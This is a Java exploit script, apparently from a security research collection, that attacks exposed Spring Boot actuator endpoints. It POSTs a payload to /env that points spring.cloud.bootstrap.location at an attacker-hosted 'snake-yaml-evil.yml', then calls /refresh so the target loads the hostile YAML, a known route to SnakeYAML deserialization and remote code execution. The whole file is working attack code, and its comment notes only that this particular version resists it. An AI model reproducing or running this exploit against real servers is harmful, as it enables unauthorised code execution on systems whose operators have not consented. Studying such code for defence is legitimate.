package com.threedr3am.bug.spring.actuator;

import java.io.UnsupportedEncodingException;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;

/**
 * copy snake-yaml-evil.yml to http server root（but this springcloud version attack fail）
 *
 * @author threedr3am
 */
public class AttackSnakeYaml {

  public static void main(String[] args) throws UnsupportedEncodingException {
    String payload = "spring.cloud.bootstrap.location=http://127.0.0.1:80/snake-yaml-evil.yml";
    String target = "http://localhost:8080";

    HttpPost httpPost = new HttpPost(target + "/env");
    HttpEntity httpEntity = new StringEntity(payload, "application/x-www-form-urlencoded", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    httpPost = new HttpPost(target + "/refresh");
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableRedirectHandling()
          .disableCookieManagement()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
